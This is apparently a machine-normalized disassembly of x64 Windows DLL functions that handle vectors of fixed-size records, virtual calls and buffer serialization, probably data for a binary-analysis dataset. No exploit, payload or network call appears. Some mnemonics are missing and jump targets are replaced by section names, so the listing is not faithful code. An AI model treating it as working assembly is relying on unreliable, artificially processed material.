lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_180004980
mov rax rsp
push r13
push r14
push r15
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov r12 rcx
call sub_1800047c0
xor r14d r14d
mov r15d 0xffff
nop [ rax + rax ] ax
mov rcx [ r12 + 0x18 ]
mov rax [ rcx ]
call [ rax + 0x30 ]
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x30 ] r14
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_180001450
nop
mov rdx [ rsp + 0x28 ]
test rdx rdx
je r-xdata
mov rcx [ rcx + rdx * 8 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x40 ] r14
mov rdx rax
lea rcx [ rsp + 0x38 ]
call sub_1800033c0
nop
mov rdx [ rsp + 0x38 ]
test rdx rdx
je r-xdata
mov rbx [ rsp + 0x30 ]
cmp [ rdx ] 0x0
jne r-xdata
mov rbx [ rsp + 0x40 ]
cmp [ rdx + 0x4 ] r15w
je r-xdata
mov ecx 0x64
call [ Sleep@IAT ]
nop
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
lea rsi [ rsp + 0x58 ]
mov [ rsp + 0x58 ] r14
mov [ rsp + 0x60 ] r14
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
cmp [ rdx + 0x8 ] 0x0
je r-xdata
inc sil
jmp r-xdata
[ rbx + 0x8 ]
jne r-xdata
lea r13 [ rsp + 0x48 ]
mov [ rsp + 0x48 ] r14
mov [ rsp + 0x50 ] r14
mov rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov sil 0x1
nop [ rax + rax ] ax
[ rbx + 0x8 ]
jne r-xdata
xor eax eax
jmp r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rdx rsi
mov rcx r12
call sub_180003a90
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov rcx [ r12 + 0x48 ]
movzx edx sil
mov rax [ r12 + 0x50 ]
sub rax rcx
sar rax 0x3
cmp rdx rax
jae r-xdata
mov rbx [ rsp + 0x40 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rdx r13
mov rcx r12
call sub_180004140
jmp r-xdata
nop [ rax + rax ] ax
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
cmp [ r12 + 0xc0 ] 0x0
je r-xdata
mov rbx [ rsp + 0x30 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
jne r-xdata
mov rcx [ rsp + 0x40 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x40 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
jmp r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov r8 rbx
mov rcx rsi
call sub_180003340
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov r8 rbx
mov rcx r13
call sub_180003340
sub_180004bd0
cmp rdx r8
je r-xdata
retn
push rsi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rdi
mov rsi r8
lea rdi [ rdx + 0x8 ]
nop [ rax + rax ] eax
add rdi 0x10
lea rax [ rdi - 0x8 ]
cmp rax rsi
jne r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rbx [ rdi ]
test rbx rbx
je r-xdata
mov rdi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rsi
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180004c40
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
push r12
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x60 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
add rsp 0x38
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x68 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x70 ] rbx
add rdi 0x28
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rdx rdi
mov rcx rbx
call sub_180003cb0
nop
cmp rdi rsi
je r-xdata
sub_180004cc0
push rbx
sub rsp 0x20
mov rdx [ rcx ]
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
mov r8 [ rcx + 0x8 ]
call sub_180004bd0
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180004d00
push r12
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rbx rcx
mov rax 0xfffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x4
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
add rcx 0x18
call sub_1800032a0
mov r12 rax
mov [ rsp + 0x58 ] rax
movzx r8d [ rsp + 0x58 ]
mov [ rsp + 0x28 ] r8b
mov [ rsp + 0x20 ] 0x0
lea r9 [ rbx + 0x18 ]
mov r8 rax
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_180004750
nop
mov r8 [ rbx + 0x8 ]
mov rdx [ rbx ]
mov rsi r8
sub rsi rdx
test rdx rdx
je r-xdata
shl rdi 0x4
add rdi r12
mov [ rbx + 0x10 ] rdi
and rsi 0xfffffffffffffff0
add rsi r12
mov [ rbx + 0x8 ] rsi
mov [ rbx ] r12
mov rcx rbx
call sub_180004bd0
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180004de0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r12 [ rw-data ]
lea rdi [ rdx + 0x8 ]
mov rsi rdx
mov [ r8 ] r12
mov r10 [ rdi ]
mov rcx [ rdi + 0x8 ]
sub rcx r10
mov r14 0x6666666666666667
xor r9b r9b
mov rax r14
xor r13d r13d
mov rbx r8
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov rcx [ rbx ]
mov edx 0x1
call sub_180021308
mov rbp rax
test rax rax
jne r-xdata
mov r8d r13d
nop [ rax + rax ] ax
movzx ecx [ rsi ]
mov rax [ rw-data ]
lea rbx [ r12 + rbp ]
mov [ rax + rbp ] cx
movzx ecx [ rsi + 0x2 ]
mov rax [ rw-data ]
mov [ rax + rbp ] cl
mov rax [ rw-data ]
movzx ecx [ rsi + 0x3 ]
mov [ rax + rbp ] cl
mov rcx [ rdi + 0x8 ]
mov rax r14
sub rcx [ rdi ]
xor r12b r12b
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov rcx rdi
mov [ rbx ] r13
call sub_180002870
xor eax eax
jmp r-xdata
lea rax [ r8 + r8 * 4 ]
inc r9b
mov rcx [ r10 + rax * 8 + 0x10 ]
mov rax r14
movzx r8d r9b
lea rcx [ rcx + rcx + 0x3 ]
add [ rbx ] rcx
mov r10 [ rdi ]
mov rcx [ rdi + 0x8 ]
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jb r-xdata
mov rbx [ rdi ]
test rbx rbx
je r-xdata
mov r8 r13
nop [ rax + rax ] ax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov [ rdi ] r13
mov [ rdi + 0x8 ] r13
mov [ rdi + 0x10 ] r13
mov rax rbp
mov rsi [ rdi + 0x8 ]
cmp rbx rsi
je r-xdata
mov rdx [ rax + rsi * 8 + 0x10 ]
lea rcx [ rbx + 0x1 ]
add r9 r9
add rdx rdx
call sub_18002134c
mov r11 [ rdi ]
mov rcx [ rdi + 0x8 ]
mov rax [ r11 + rsi * 8 + 0x10 ]
sub rcx r11
inc r12b
lea rbx [ rbx + rax * 2 + 0x3 ]
mov rax r14
movzx r8d r12b
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jb r-xdata
mov r8 [ r8 ]
mov rcx [ rdi ]
call j_sub_18002094c#2
nop [ rax ] eax
movzx eax [ rw-data ]
lea rsi [ r8 + r8 * 4 ]
mov [ rbx ] al
mov rax [ rdi ]
cmp [ rax + rsi * 8 + 0x18 ] 0x8
mov r9 [ rax + rsi * 8 + 0x10 ]
lea r8 [ rax + rsi * 8 ]
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_180004ff0
push rdi
sub rsp 0x30
mov rdi rcx
mov rcx [ rcx + 0x8 ]
mov r8 [ rdi ]
cmp r8 rcx
je r-xdata
add rsp 0x30
pop rdi
retn
movzx r9d [ rsp + 0x40 ]
mov [ rsp + 0x48 ] rbx
mov rdx rcx
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x28 ] rsi
call sub_180004600
mov rsi [ rdi + 0x8 ]
mov rbp rax
mov rbx rax
cmp rax rsi
je r-xdata
mov rsi [ rsp + 0x28 ]
mov rbx [ rsp + 0x48 ]
mov [ rdi + 0x8 ] rbp
mov rbp [ rsp + 0x50 ]
mov [ rsp + 0x20 ] r12
xor r12d r12d
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r12 [ rsp + 0x20 ]
sub_180005090
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] rsi
mov rdi rdx
mov rbx rcx
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rbx ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rdi
retn
mov rdx rdi
lea rcx [ rbx + 0x18 ]
call sub_180003230
mov rsi rax
mov [ rsp + 0x68 ] rax
movzx eax [ rsp + 0x68 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] 0x0
lea r9 [ rbx + 0x18 ]
mov r8 rsi
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_180004c40
nop
mov r8 [ rbx + 0x8 ]
mov r9 [ rbx ]
mov rcx r8
sub rcx r9
mov rax r13
imul rcx
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test r9 r9
je r-xdata
lea rax [ rdi + rdi * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x10 ] rcx
lea rax [ r12 + r12 * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x8 ] rcx
mov [ rbx ] rsi
mov rdx r9
mov rcx rbx
call sub_180002810
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_1800051b0
mov r11 rsp
mov [ r11 + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov rbp rdx
mov r12 rcx
xor edi edi
mov [ r11 + 0x8 ] rdi
movzx eax [ rdx ]
mov [ rsp + 0x28 ] ax
movzx eax [ rdx + 0x2 ]
mov [ rsp + 0x2a ] al
movzx eax [ rdx + 0x3 ]
mov [ rsp + 0x2b ] al
lea r13 [ rdx + 0x8 ]
mov rdx r13
lea rcx [ r11 - 0x48 ]
call sub_1800028f0
lea r8 [ rsp + 0x80 ]
lea rdx [ rsp + 0x28 ]
mov rcx r12
call sub_180004de0
mov rsi rax
lea ecx [ rdi + 0x18 ]
call sub_180021000
mov rbx rax
test rax rax
je r-xdata
mov rbx rdi
movzx ecx [ rw-data ]
mov [ rax + 0x4 ] di
mov [ rax + 0x6 ] dil
mov [ rax + 0x7 ] cl
mov [ rax + 0x8 ] rsi
mov rax [ rsp + 0x80 ]
mov [ rbx + 0x10 ] rax
mov [ rbx ] edi
jmp r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov r8d 0x8
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call sub_180017bc0
mov rcx [ r12 + 0x38 ]
mov r10 [ rcx ]
movzx r9d [ rbp ]
mov r8 rax
mov rdx rsi
call [ r10 + 0x18 ]
movzx ebp al
test rdi rdi
je r-xdata
mov rcx rax
call sub_180017520
mov rdi rax
mov rcx [ r12 + 0x20 ]
mov rax [ rcx ]
mov rdx rbx
call [ rax + 0x8 ]
mov rsi rax
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x80 ] rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
test rsi rsi
je r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx r13
call sub_180002870
movzx eax bpl
mov rbx [ rsp + 0x90 ]
add rsp 0x50
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18002094c#2
call sub_18002094c
mov rcx rsi
call j_sub_18002094c#2
nop
call sub_18002094c
sub_180005350
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
mov rsi rdx
mov rdi rcx
cmp rcx rdx
je r-xdata
mov rax rcx
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rdx + 0x8 ]
mov r11 [ rdx ]
mov [ rsp + 0x50 ] rbp
mov r8 rcx
mov rbp 0x6666666666666667
sub r8 r11
mov rax rbp
imul r8
mov r9 rdx
sar r9 0x4
mov rax r9
shr rax 0x3f
add r9 rax
jne r-xdata
mov r10 [ rdi ]
mov [ rsp + 0x48 ] rbx
mov rbx [ rdi + 0x8 ]
mov r8 rbx
mov rax rbp
sub r8 r10
imul r8
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
cmp r9 r8
ja r-xdata
mov rcx rdi
call sub_180004ff0
mov rbp [ rsp + 0x50 ]
mov rax rdi
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rdi + 0x10 ]
mov rax rbp
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r9 rdx
ja r-xdata
mov rdx rcx
mov r8 r10
mov rcx r11
call sub_1800045a0
mov r8 [ rdi + 0x8 ]
mov rcx rdi
mov rdx rax
call sub_180002810
mov rcx [ rsi + 0x8 ]
mov rax rbp
sub rcx [ rsi ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
mov rax [ rdi ]
lea rcx [ rdx + rdx * 4 ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi + 0x8 ] rcx
jmp r-xdata
test r10 r10
je r-xdata
lea rax [ r8 + r8 * 4 ]
mov rcx r11
mov r8 r10
lea rbx [ r11 + rax * 8 ]
mov rdx rbx
call sub_1800045a0
movzx eax [ rsp + 0x40 ]
mov r8 [ rdi + 0x8 ]
mov rdx [ rsi + 0x8 ]
mov [ rsp + 0x20 ] al
lea r9 [ rdi + 0x18 ]
mov rcx rbx
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rax rdi
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rsi + 0x8 ]
mov rax rbp
sub rcx [ rsi ]
imul rcx
mov rcx rdi
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
call sub_1800011f0
test al al
je r-xdata
mov r8 rbx
mov rdx r10
mov rcx rdi
call sub_180002810
mov rcx [ rdi ]
call j_sub_18002094c#2
movzx eax [ rsp + 0x40 ]
mov r8 [ rdi ]
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
mov [ rsp + 0x20 ] al
lea r9 [ rdi + 0x18 ]
jmp r-xdata
call sub_1800046d0
mov [ rdi + 0x8 ] rax
sub_180005510
push rdi
sub rsp 0x20
mov r8 [ rcx + 0x8 ]
mov r11 rdx
mov rdi 0x6666666666666667
sub r8 [ rcx ]
mov rax rdi
mov r9 0x666666666666666
mov r10 rcx
imul r8
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax r9
sub rax r11
cmp rax r8
jae r-xdata
mov rcx [ rcx + 0x10 ]
mov rax rdi
add r8 r11
sub rcx [ r10 ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
add rsp 0x20
pop rdi
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
xor edx edx
jmp r-xdata
cmp rdx r8
mov rcx r10
cmovb rdx r8
call sub_180005090
sub_1800055c0
mov [ rsp + 0x8 ] rcx
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1f ]
sub rsp 0xb8
mov [ rbp - 0x21 ] 0xfffffffffffffffe
mov r15 rcx
mov rax [ rcx + 0x50 ]
sub rax [ rcx + 0x48 ]
sar rax 0x3
mov [ rbp + 0x77 ] rax
mov r14d 0xa
xor r13d r13d
mov esi r13d
mov [ rbp - 0x79 ] r13
mov edi r13d
mov [ rbp - 0x71 ] r13
mov r12d r13d
mov [ rbp - 0x69 ] r13
mov [ rbp + 0x6f ] r13b
mov r8 [ rcx + 0x98 ]
mov rcx [ rcx + 0xa0 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov rcx [ rbp + 0x77 ]
lea rax [ r14 + rcx - 0x1 ]
lea rax [ rax + rcx * 2 - 0x2 ]
mov [ rbp + 0x6f ] rax
mov r14d 0x1
mov edx r14d
mov rcx rax
call sub_180021308
mov rbx rax
mov [ rbp - 0x29 ] rax
test rax rax
jne r-xdata
mov r9d r13d
nop
mov rax [ r15 ]
mov rcx r15
call [ rax + 0x18 ]
mov [ rbx ] ax
lea r12 [ rbx + 0x2 ]
mov eax [ r15 + 0xb8 ]
mov [ r12 ] rax
mov eax [ r15 + 0xbc ]
mov [ r12 + 0x4 ] rax
add r12 0x8
xor r15b r15b
mov r13 rdi
sub r13 rsi
sar r13 0x4
test r13 r13
je r-xdata
cmp rsi rdi
je r-xdata
xor r13d r13d
mov rbx [ rbp + 0x7f ]
lea r14 [ r14 + rbx + 0x1 ]
mov ecx 0x10
call sub_180021000
test rax rax
je r-xdata
cmp rsi rdi
je r-xdata
mov rax [ rbp + 0x6f ]
lea r14 [ rbx + rax ]
xor ebx ebx
nop [ rax + rax ] ax
test rsi rsi
je r-xdata
movzx r9d [ rbp + 0x67 ]
mov r8 rsi
mov rdx rdi
mov rcx rdi
call sub_180004080
mov r12 rax
cmp rax rdi
je r-xdata
jmp r-xdata
xor r13d r13d
mov eax r13d
mov [ rax ] r13
mov [ rax + 0x8 ] rbx
xor r13d r13d
jmp r-xdata
mov r13b 0x1
mov r15 [ rbp - 0x29 ]
cmp [ rbp + 0x77 ] 0x1
jbe r-xdata
movzx r9d [ rbp + 0x67 ]
mov r8 rsi
mov rdx rdi
mov rcx rdi
call sub_180004080
mov r13 rax
cmp rax rdi
je r-xdata
mov r14d 0x1
movzx eax [ rw-data ]
mov [ r12 ] al
inc r12
mov rdx [ rsi + rbx * 8 ]
mov r9 [ rdx + 0x8 ]
mov r8 [ rdx ]
mov rdx r9
mov rcx r12
call sub_18002134c
mov r11 [ rsi + rbx * 8 ]
add r12 [ r11 + 0x8 ]
inc r15b
movzx ebx r15b
cmp rbx r13
jb r-xdata
xor al al
jmp r-xdata
cmp rsi rdi
je r-xdata
mov rdi r12
mov [ rbp - 0x71 ] r12
lea rsi [ rax + 0x8 ]
mov [ rbp + 0x7f ] r13
lea rcx [ r9 + r9 * 4 ]
movzx eax [ r8 + rcx * 8 ]
mov [ rbp - 0x19 ] ax
movzx eax [ r8 + rcx * 8 + 0x2 ]
mov [ rbp - 0x17 ] al
movzx eax [ r8 + rcx * 8 + 0x3 ]
mov [ rbp - 0x16 ] al
lea rdx [ r8 + rcx * 8 + 0x8 ]
lea rcx [ rbp - 0x11 ]
call sub_1800028f0
lea r8 [ rbp + 0x7f ]
lea rdx [ rbp - 0x19 ]
mov rcx r15
call sub_180004de0
mov r13 rax
test rax rax
je r-xdata
cmp rdi r12
jne r-xdata
lea rax [ rbp - 0x59 ]
cmp rsi rax
ja r-xdata
mov [ rbp - 0x59 ] r13
mov [ rbp - 0x51 ] r13
mov rdx rax
lea rcx [ rbp - 0x59 ]
call sub_180003620
nop
lea rax [ rbp - 0x59 ]
cmp rax rdi
jae r-xdata
mov ecx 0x18
call sub_180021000
mov r12 rax
mov [ rbp + 0x77 ] rax
mov r13 [ rbp + 0x67 ]
test rax rax
je r-xdata
lea rbx [ r12 + 0x2 ]
mov rsi [ rbp + 0x6f ]
mov rdi [ rbp + 0x67 ]
mov rdi r13
mov [ rbp - 0x71 ] r13
lea rsi [ rax + 0x8 ]
add rbx rbx
mov rax [ rsi + rbx * 8 ]
mov rcx [ rax + 0x8 ]
lea rax [ r12 + rcx ]
cmp rax r14
ja r-xdata
add rsp 0xb8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx rsi
call j_sub_18002094c#2
add rsi 0x8
add rsi 0x10
lea rax [ rsi - 0x8 ]
cmp rax rdi
jne r-xdata
[ rbx + 0x8 ]
jne r-xdata
test rdi rdi
je r-xdata
mov rcx rdi
sub rcx rsi
sar rcx 0x4
mov rax 0xffffffffffffffe
cmp rcx rax
ja r-xdata
lea rbx [ rbp - 0x59 ]
sub rbx rsi
cmp rdi r12
jne r-xdata
xor ebx ebx
mov r12d ebx
movzx ebx [ rw-data ]
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x18 ]
mov [ r12 + 0x4 ] ax
mov [ r12 + 0x6 ] 0x1
mov [ r12 + 0x7 ] bl
mov [ r12 + 0x8 ] r15
mov rax [ rbp + 0x6f ]
mov [ r12 + 0x10 ] rax
xor ebx ebx
mov [ r12 ] ebx
jmp r-xdata
inc r13b
movzx r14d r13b
cmp r14 [ rbp + 0x77 ]
jb r-xdata
lea rcx [ r15 + rsi ]
cmp rbx rcx
ja r-xdata
add rsi 0x10
lea rax [ rsi - 0x8 ]
cmp rax rdi
jne r-xdata
[ rbx + 0x8 ]
jne r-xdata
add rsi 0x10
lea rax [ rsi - 0x8 ]
cmp rax rdi
jne r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rbx [ rsi ]
test rbx rbx
je r-xdata
mov rsi [ rbp - 0x79 ]
mov rdi [ rbp - 0x71 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rdx [ rbp - 0x51 ]
mov [ rdi ] r13
mov [ rdi + 0x8 ] r13
lea rax [ rbp - 0x59 ]
cmp rdi rax
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
inc rcx
mov rdx r12
sub rdx rsi
sar rdx 0x4
cmp rcx rdx
jbe r-xdata
and rbx 0xfffffffffffffff0
add rbx rsi
test rdi rdi
je r-xdata
mov rcx rdi
sub rcx rsi
sar rcx 0x4
mov rax 0xffffffffffffffe
cmp rcx rax
ja r-xdata
mov [ rbp - 0x39 ] rbx
mov [ rbp - 0x31 ] rbx
mov rbx [ rbp - 0x41 ]
test rbx rbx
je r-xdata
mov ecx [ rax ]
mov rax [ rbp - 0x49 ]
mov [ rax ] ecx
mov [ rbp - 0x49 ] rbx
mov [ rbp - 0x41 ] rbx
mov rdx r12
lea rcx [ rbp - 0x49 ]
call sub_1800033c0
nop
mov rax [ r13 + 0x70 ]
cmp rax [ r13 + 0x78 ]
je r-xdata
mov rax [ rdi + 0x48 ]
mov rcx [ rax + r14 * 8 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
test ax ax
je r-xdata
mov rdi [ rbp - 0x71 ]
mov rsi [ rbp - 0x79 ]
movzx ecx [ rw-data ]
mov [ r12 ] cl
mov [ r12 + 0x1 ] ax
add r12 0x3
add rbx 0x3
mov rbx [ rsi ]
test rbx rbx
je r-xdata
mov rsi [ rbp - 0x79 ]
mov rdi [ rbp - 0x71 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsi ]
test rbx rbx
je r-xdata
mov rsi [ rbp - 0x79 ]
mov rdi [ rbp - 0x71 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
movzx eax [ rbp + 0x6f ]
inc al
mov [ rbp + 0x6f ] al
mov r8 [ r15 + 0x98 ]
movzx r9d al
mov rcx [ r15 + 0xa0 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r9 rdx
jae r-xdata
[ rdx + 0x8 ]
jne r-xdata
mov rdx r13
mov rax [ rbp - 0x51 ]
mov [ rdi + 0x8 ] rax
mov [ rbp - 0x51 ] rdx
mov rcx [ rdi ]
mov rax [ rbp - 0x59 ]
mov [ rdi ] rax
mov [ rbp - 0x59 ] rcx
jmp r-xdata
mov r8 rdx
shr r8 0x1
mov rax 0xfffffffffffffff
sub rax r8
cmp rax rdx
jae r-xdata
mov [ rdi ] r13
mov [ rdi + 0x8 ] r13
cmp rdi rbx
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
inc rcx
mov rdx r12
sub rdx rsi
sar rdx 0x4
cmp rcx rdx
jbe r-xdata
lea rdx [ rbp - 0x39 ]
mov rcx r13
call sub_180004140
nop
test rbx rbx
je r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov r12 [ rbp - 0x69 ]
mov rdi [ rbp - 0x71 ]
mov rsi [ rbp - 0x79 ]
jmp r-xdata
mov rbx [ rbp - 0x51 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
add rdi 0x10
mov [ rbp - 0x71 ] rdi
test rdx rdx
je r-xdata
add rdx r8
mov rdx r13
jmp r-xdata
mov rax [ rbx + 0x8 ]
mov [ rdi + 0x8 ] rax
mov [ rbx + 0x8 ] r13
mov rcx [ rdi ]
mov rax [ rbx ]
mov [ rdi ] rax
mov [ rbx ] rcx
jmp r-xdata
mov r8 rdx
shr r8 0x1
mov rax 0xfffffffffffffff
sub rax r8
cmp rax rdx
jae r-xdata
test rsi rsi
je r-xdata
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov rbx [ rbp - 0x41 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
mov rcx [ rbp - 0x51 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
cmp rdx rcx
cmovb rdx rcx
lea rcx [ rbp - 0x79 ]
call sub_180004d00
mov r12 [ rbp - 0x69 ]
mov rdi [ rbp - 0x71 ]
mov rsi [ rbp - 0x79 ]
add rdx r8
mov rdx r13
jmp r-xdata
mov al 0x1
cmp rsi rdi
je r-xdata
mov rsi [ rbp - 0x79 ]
